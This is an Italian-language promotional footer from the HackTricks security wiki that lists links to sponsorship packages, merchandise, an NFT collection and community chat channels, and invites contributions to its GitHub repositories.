* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
